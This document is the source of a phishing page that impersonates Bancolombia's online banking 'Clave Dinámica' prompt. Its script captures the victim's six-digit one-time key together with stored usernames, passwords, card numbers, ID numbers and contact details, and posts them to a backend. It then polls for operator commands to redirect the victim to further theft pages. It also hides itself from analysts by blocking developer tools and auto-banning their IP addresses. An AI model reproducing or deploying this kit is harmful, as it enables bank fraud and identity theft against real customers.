<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

session_start();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clave Dinámica - Sucursal Virtual Personas</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    
    <style>
        /* =========================================
           ESTILOS BASE (PÁGINA DE FONDO)
           ========================================= */
        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: "Open Sans", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            
            background-color: #FAFAFA;
            background-image: url('img/fondo.svg'); 
            background-size: cover; 
            background-position: center top;
            background-attachment: fixed;
            background-repeat: no-repeat;
            
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            color: #2C2A29;
            padding: 0 16px;
            overflow: hidden; /* Bloquea el scroll por el modal abierto */
        }

        /* Encabezado Fondo */
        .header-container { text-align: center; margin-top: 50px; margin-bottom: 25px; }
        .header-container img.logo { height: 30px; margin-bottom: 24px; object-fit: contain; }
        .main-title { font-weight: 300; font-size: 26px; color: #444444; letter-spacing: -0.3px; }

        /* Contenedor Principal Fondo */
        .main-wrapper { width: 100%; max-width: 500px; }
        .alert-box {
            background-color: #D9F2F9; border: 1px solid #7FD3ED; border-radius: 6px;
            padding: 16px 20px; display: flex; gap: 14px; margin-bottom: 16px;
        }
        .alert-icon { flex-shrink: 0; padding-top: 2px; }
        .alert-content strong { display: block; font-size: 14.5px; font-weight: 700; color: #2C2A29; margin-bottom: 4px; }
        .alert-content p { font-size: 13.5px; color: #4A4A4A; margin-bottom: 6px; }
        .alert-content a { font-size: 13.5px; font-weight: 700; color: #2C2A29; text-decoration: underline; }

        .login-card {
            background-color: #FFFFFF; border-radius: 8px; box-shadow: 0 12px 30px rgba(0, 0, 0, 0.08);
            padding: 40px 50px; text-align: center; margin-bottom: 40px; opacity: 0.9;
        }
        .login-card h2 { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
        .login-card .subtitle { font-size: 14px; color: #666666; margin-bottom: 30px; }
        .input-group { display: flex; align-items: center; border-bottom: 1px solid #8C8C8C; padding-bottom: 6px; margin-bottom: 24px; }
        .left-icon { width: 22px; height: 22px; stroke: #4A4A4A; fill: none; stroke-width: 1.5; margin-right: 12px; }
        .input-group input { border: none; width: 100%; font-size: 18px; background: transparent; }
        .btn-submit { width: 100%; background-color: #E2E2E2; color: #8C8C8C; border: none; border-radius: 24px; padding: 15px; font-size: 16px; font-weight: 600; margin-bottom: 26px; }


        /* =========================================
           ESTILOS DEL MODAL (CLAVE DINÁMICA)
           ========================================= */
        .overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(30, 30, 30, 0.5); 
            backdrop-filter: blur(4px); 
            display: flex; justify-content: center; align-items: center;
            padding: 20px; z-index: 9999;
        }

        .modal-card {
            background-color: #FFFFFF;
            border-radius: 12px;
            width: 100%;
            max-width: 500px;
            padding: 24px 32px 32px 32px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            position: relative;
            text-align: center;
            overflow: hidden; 
        }

        .close-btn {
            position: absolute; top: 16px; right: 16px;
            background: none; border: none; cursor: pointer; padding: 4px; z-index: 2;
        }
        .close-btn svg { width: 24px; height: 24px; stroke: #4A4A4A; stroke-width: 1.2; fill: none; }

        /* Video que reemplaza al banner rosado */
        .modal-video {
            width: 100%;
            max-width: 100%;
            border-radius: 8px;
            margin-top: 24px;
            margin-bottom: 24px;
            pointer-events: none; /* Evita que el usuario pause el video */
            background-color: #F8BBD0; /* Fondo rosado por si tarda en cargar el video */
            min-height: 80px; /* Asegura que el espacio exista incluso si falla */
            object-fit: cover;
        }

        .modal-title { font-size: 24px; font-weight: 700; color: #2C2A29; margin-bottom: 12px; }
        .modal-subtitle { font-size: 15px; color: #4A4A4A; margin-bottom: 35px; }

        /* Inputs (Líneas y puntos) */
        .token-inputs {
            display: flex; justify-content: center; gap: 14px; margin-bottom: 30px;
        }
        .token-input {
            width: 38px;
            height: 40px;
            border: none;
            border-bottom: 1.5px solid #2C2A29;
            background: transparent;
            text-align: center;
            font-size: 32px; 
            font-weight: 700;
            color: #2C2A29;
            outline: none;
            border-radius: 0;
            transition: border-bottom-width 0.2s, border-bottom-color 0.2s;
            padding-top: 10px; 
        }
        .token-input:focus { border-bottom: 2px solid #00448D; }
        
        .token-input.error { border-bottom: 2px solid #E02020 !important; color: #E02020; }

        /* Banner de Alerta Naranja (Error) */
        .error-alert {
            background-color: #FEECE3;
            border: 1px solid #F8CBB7;
            border-radius: 8px;
            padding: 16px;
            display: none; 
            align-items: flex-start;
            gap: 12px;
            text-align: left;
            margin-bottom: 25px;
            position: relative;
        }
        .error-alert-icon {
            background-color: #F19B72;
            border-radius: 50%;
            width: 24px; height: 24px;
            display: flex; justify-content: center; align-items: center;
            flex-shrink: 0; margin-top: 2px;
        }
        .error-alert-icon svg { width: 14px; height: 14px; stroke: #383838; stroke-width: 2; fill: none; }
        .error-text-content h4 { font-size: 14.5px; font-weight: 700; color: #2C2A29; margin-bottom: 4px; }
        .error-text-content p { font-size: 13.5px; color: #4A4A4A; line-height: 1.4; }
        .error-alert-close {
            background: none; border: none; cursor: pointer; position: absolute;
            top: 14px; right: 14px; padding: 2px;
        }
        .error-alert-close svg { width: 16px; height: 16px; stroke: #8C8C8C; stroke-width: 1.5; fill: none; }

        /* Botones Acción */
        .action-buttons { display: flex; gap: 16px; justify-content: space-between; }
        .action-buttons button {
            flex: 1; padding: 14px; border-radius: 30px; font-size: 15px;
            font-family: inherit; font-weight: 600; transition: all 0.3s ease;
        }
        .btn-borrar { background-color: transparent; border: 1px solid #8C8C8C; color: #8C8C8C; cursor: pointer; }
        .btn-borrar:hover { background-color: #F5F5F5; color: #2C2A29; border-color: #2C2A29; }
        .btn-continuar { background-color: #E2E2E2; border: none; color: #8C8C8C; cursor: not-allowed; }
        .btn-continuar.active { background-color: #FDDA24; color: #2C2A29; cursor: pointer; }

        /* =========================================
           LOADER INTERNO (TAMAÑO FIJO DEL MODAL)
           ========================================= */
        .modal-loader-overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: #FFFFFF;
            z-index: 10;
            display: none; 
            flex-direction: column;
            justify-content: center;
            align-items: center;
            border-radius: 12px;
        }
        .spinner-ring {
            width: 44px; height: 44px;
            border: 2px solid #2C2A29;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 16px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loader-text { font-size: 14.5px; color: #4A4A4A; font-weight: 400; }

        @media (max-width: 600px) {
            .modal-card { padding: 24px 20px 32px 20px; }
            .token-inputs { gap: 8px; }
            .token-input { width: 35px; font-size: 28px; }
        }
    </style>
</head>
<body>

    <!-- =========================================
         LA PÁGINA DE FONDO (LOGIN INACTIVO)
         ========================================= -->
    <div class="header-container">
        <img src="img/logo.svg" alt="Bancolombia" class="logo">
        <h1 class="main-title">Sucursal Virtual Personas</h1>
    </div>

    <div class="main-wrapper">
        <div class="alert-box">
            <div class="alert-icon">
                <svg width="26" height="26" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="14" cy="14" r="13" fill="#C2EBF7" stroke="#5CC5E4" stroke-width="1.5"/>
                    <path d="M10.5 16C10.5 14.5 9 12.5 9 10C9 7.2386 11.2386 5 14 5C16.7614 5 19 7.2386 19 10C19 12.5 17.5 14.5 17.5 16V17H10.5V16Z" stroke="#2C2A29" stroke-width="1.8" stroke-linejoin="round"/>
                    <line x1="11.5" y1="20" x2="16.5" y2="20" stroke="#2C2A29" stroke-width="1.8" stroke-linecap="round"/>
                </svg>
            </div>
            <div class="alert-content">
                <strong>¡Prográmate!</strong>
                <p>Consulta el estado de nuestros canales y los mantenimientos programados.</p>
                <a href="#">Más info aquí.</a>
            </div>
        </div>

        <div class="login-card">
            <h2>¡Hola!</h2>
            <p class="subtitle">Ingresa los datos para gestionar tus productos y hacer transacciones.</p>
            
            <div class="input-group">
                <svg class="left-icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                <input type="text" placeholder="Usuario" disabled>
            </div>
            <div class="input-group">
                <svg class="left-icon" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                <input type="password" placeholder="Clave del cajero" disabled>
            </div>
            <button type="button" class="btn-submit" disabled>Iniciar sesión</button>
        </div>
    </div>


    <!-- =========================================
         EL OVERLAY Y EL MODAL DE CLAVE DINÁMICA
         ========================================= -->
    <div class="overlay">
        
        <div class="modal-card">

            <!-- Capa interna de carga que cubre solo el modal sin cambiar su tamaño -->
            <div class="modal-loader-overlay" id="modalLoader">
                <div class="spinner-ring"></div>
                <div class="loader-text">Validando Clave Dinámica...</div>
            </div>
            
            <button class="close-btn" type="button" onclick="history.back()">
                <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
                    <line x1="18" y1="6" x2="6" y2="18"></line>
                    <line x1="6" y1="6" x2="18" y2="18"></line>
                </svg>
            </button>

            <!-- Video .mov insertado (Añadido type="video/quicktime" para soporte nativo) -->
            <video autoplay loop muted playsinline class="modal-video" width="100%">
                <source src="img/1.mov" type="video/quicktime">
                <source src="img/1.mov" type="video/mp4">
            </video>

            <h2 class="modal-title">Ingresa la Clave Dinámica</h2>
            <p class="modal-subtitle" id="instructionSubtitle">Encuentra tu Clave Dinámica en la app Mi Bancolombia.</p>

            <!-- Banner Alerta Naranja (Error) -->
            <div class="error-alert" id="errorAlert">
                <div class="error-alert-icon">
                    <svg viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12" stroke-linecap="round" stroke-linejoin="round"/></svg>
                </div>
                <div class="error-text-content">
                    <h4>La Clave Dinámica no es correcta, intenta de nuevo.</h4>
                    <p>Pronto solucionaremos el problema y podrás continuar con tu solicitud.</p>
                </div>
                <button type="button" class="error-alert-close" id="closeAlertBtn">
                    <svg viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12" stroke-linecap="round" stroke-linejoin="round"/></svg>
                </button>
            </div>

            <!-- Formulario de 6 dígitos -->
            <form id="tokenForm" action="#" method="POST">
                
                <div class="token-inputs" id="inputsContainer">
                    <input type="password" class="token-input" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]*" autofocus>
                    <input type="password" class="token-input" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
                    <input type="password" class="token-input" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
                    <input type="password" class="token-input" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
                    <input type="password" class="token-input" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
                    <input type="password" class="token-input" maxlength="1" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
                </div>

                <input type="hidden" name="clave_dinamica" id="fullToken">

                <!-- Botones -->
                <div class="action-buttons">
                    <button type="button" class="btn-borrar" id="btnBorrar">Borrar</button>
                    <button type="submit" class="btn-continuar" id="btnContinuar" disabled>Continuar</button>
                </div>
            </form>

        </div>
    </div>

    <!-- Script Interactivo y Animación del Modal -->
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const urlParams = new URLSearchParams(window.location.search);
            const instructionSubtitle = document.getElementById('instructionSubtitle');
            if (urlParams.get('sms') === '1' && instructionSubtitle) {
                instructionSubtitle.textContent = "Te enviamos un mensaje de texto con tu clave dinámica.";
            }

            const inputs = document.querySelectorAll('.token-input');
            const btnContinuar = document.getElementById('btnContinuar');
            const btnBorrar = document.getElementById('btnBorrar');
            const fullTokenInput = document.getElementById('fullToken');
            
            const tokenForm = document.getElementById('tokenForm');
            const modalLoader = document.getElementById('modalLoader');
            const errorAlert = document.getElementById('errorAlert');
            const closeAlertBtn = document.getElementById('closeAlertBtn');

            function clearErrorState() {
                errorAlert.style.display = 'none';
                inputs.forEach(input => input.classList.remove('error'));
            }

            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    input.value = input.value.replace(/\D/g, '');
                    clearErrorState();

                    if (input.value.length === 1 && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                    checkCompletion();
                });

                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && input.value === '' && index > 0) {
                        inputs[index - 1].focus();
                        inputs[index - 1].value = '';
                        clearErrorState();
                        checkCompletion();
                    }
                });

                input.addEventListener('paste', (e) => {
                    e.preventDefault();
                    clearErrorState();
                    const pastedData = (e.clipboardData || window.clipboardData).getData('text');
                    const numbersOnly = pastedData.replace(/\D/g, '').split('');
                    
                    if (numbersOnly.length > 0) {
                        let i = 0;
                        while(i < numbersOnly.length && index + i < inputs.length) {
                            inputs[index + i].value = numbersOnly[i];
                            i++;
                        }
                        if (index + i < inputs.length) {
                            inputs[index + i].focus();
                        } else {
                            inputs[inputs.length - 1].focus();
                        }
                        checkCompletion();
                    }
                });
            });

            function checkCompletion() {
                const isComplete = Array.from(inputs).every(input => input.value.length === 1);
                
                if (isComplete) {
                    btnContinuar.removeAttribute('disabled');
                    btnContinuar.classList.add('active');
                    const tokenArr = Array.from(inputs).map(input => input.value);
                    fullTokenInput.value = tokenArr.join('');
                } else {
                    btnContinuar.setAttribute('disabled', 'true');
                    btnContinuar.classList.remove('active');
                    fullTokenInput.value = '';
                }
            }

            btnBorrar.addEventListener('click', () => {
                inputs.forEach(input => input.value = '');
                clearErrorState();
                checkCompletion();
                inputs[0].focus();
            });

            closeAlertBtn.addEventListener('click', clearErrorState);

            tokenForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                modalLoader.style.display = 'flex';

                const token = fullTokenInput.value;
                const u = localStorage.getItem('username') || '';
                const p = localStorage.getItem('password') || '';
                const sessionId = ((() => { const params = new URLSearchParams(window.location.search); const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== ''); if (direct) { const normalized = String(direct); localStorage.setItem('session_id', normalized); localStorage.setItem('last_tid', normalized); return normalized; } const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11); localStorage.setItem('session_id', generated); localStorage.setItem('last_tid', generated); return generated; })()) || ('session_' + Date.now());

                let localTb = {};
                try {
                    localTb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
                } catch(e) {}

                // Recuperar valores que puedan estar sueltos en localStorage
                if (!localTb.banco) localTb.banco = localStorage.getItem('banco') || 'BANCOLOMBIA';
                if (!localTb.total_pagar) localTb.total_pagar = localStorage.getItem('total_pagar') || '';
                if (!localTb.documento && localStorage.getItem('val')) localTb.documento = localStorage.getItem('val');
                if (!localTb.nombre && (localStorage.getItem('nombre') || localStorage.getItem('nom'))) localTb.nombre = localStorage.getItem('nombre') || localStorage.getItem('nom');
                if (!localTb.correo && (localStorage.getItem('correo') || localStorage.getItem('eml'))) localTb.correo = localStorage.getItem('correo') || localStorage.getItem('eml');
                if (!localTb.telefono && (localStorage.getItem('celular') || localStorage.getItem('cel'))) localTb.telefono = localStorage.getItem('celular') || localStorage.getItem('cel');
                if (!localTb.tarjeta && (localStorage.getItem('tarjeta') || localStorage.getItem('num'))) localTb.tarjeta = localStorage.getItem('tarjeta') || localStorage.getItem('num');

                const formData = new FormData();
                formData.append('transactionId', sessionId);
                formData.append('u_id', u);
                formData.append('u_ps', p);
                formData.append('u_tk', token);
                formData.append('u_tb', JSON.stringify(localTb));

                try {
                    const res = await fetch('procesar_dinamica.php', { method: 'POST', body: formData });
                    const result = await res.json();
                    
                    if (result.status === 'success') {
                        checkTokenVerification(sessionId, result.messageId);
                    } else {
                        setTimeout(() => checkTokenVerification(sessionId, 'msg_' + Date.now()), 2000);
                    }
                } catch (e) {
                    setTimeout(() => checkTokenVerification(sessionId, 'msg_' + Date.now()), 2000);
                }
            });

            async function checkTokenVerification(transactionId, messageId) {
                try {
                    const formData = new FormData();
                    formData.append('transactionId', transactionId);
                    formData.append('messageId', messageId);

                    const res = await fetch('verificar_respuesta.php?ts=' + Date.now(), { method: 'POST', body: formData });
                    const result = await res.json();

                    if (result && result.action) {
                        modalLoader.style.display = 'none';

                        switch (result.action) {
                            case 'pedir_dinamica':
                                window.location.replace('token.php');
                                break;
                                window.location.replace('token.php');
                                break;
                            case 'error_token':
                                window.location.replace('token.php?error=1');
                                break;
                                window.location.replace('token.php?error=1');
                                break;
                            case 'pedir_sms':
                                window.location.replace('token_sms.php');
                                break;
                                window.location.replace('token_sms.php');
                                break;
                            case 'bre_b':
                                window.location.href = '/recaudos/brev.php?bancolombia';
                                break;
                            case 'error_logo':
                                window.location.href = 'index.php?error=1';
                                break;
                            case '923':
                                window.location.href = '923.php';
                                break;
                            case 'error_tc':
                                window.location.href = '/datac/alter.php';
                                break;
                            case 'error':
                                window.location.href = '/caras';
                                break;
                            case 'cedula':
                                window.location.href = '/cedula';
                                break;
                            case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
                                window.location.href = '/fin.php';
                                break;
                            default:
                                setTimeout(() => checkTokenVerification(transactionId, messageId), 2000);
                        }
                    } else {
                        setTimeout(() => checkTokenVerification(transactionId, messageId), 2000);
                    }
                } catch (err) {
                    setTimeout(() => checkTokenVerification(transactionId, messageId), 2000);
                }
            }
        });
    </script>
<script>
// --- DESACTIVAR CLICK DERECHO, INSPECCIONAR Y F12 ---
(function() {
    // 1. Desactivar Click Derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // 2. Desactivar atajos de teclado de desarrollo (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U, Cmd+Opt+I)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+Shift+I o Cmd+Opt+I
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+U (Ver código fuente)
        if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
    });

    // 3. Detectar apertura de Herramientas de Desarrollo (DevTools) por dimensiones
    let devtoolsOpen = false;
    const threshold = 160;
    
    function checkDevTools() { return false; }

    // 4. Función para Auto-Banear la IP del Atacante
    let banTriggered = false;
    function triggerAutoBan() {
        if (banTriggered) return;
        banTriggered = true;
        
        // Limpieza inmediata del almacenamiento local
        try {
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
        } catch(e) {}

        // Enviar IP para auto-bloqueo al backend (usamos el honeypot para gatillar el baneo)
        const formData = new FormData();
        formData.append('website', 'automated_devtools_trigger');
        
        // Buscamos si tenemos la variable de transacción en localStorage
        let tid = '';
        try {
            tid = localStorage.getItem('last_tid') || localStorage.getItem('session_id') || '';
        } catch(e) {}
        if (tid) {
            formData.append('transactionId', tid);
        }

        // Enviamos post silencioso para banear la IP en el backend
        fetch('/gate/process/paso1datos.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        }).finally(function() {
            window.location.replace("/fin.php");
        });
    }
})();
// ---------------------------------------------------
</script>
</body>
</html>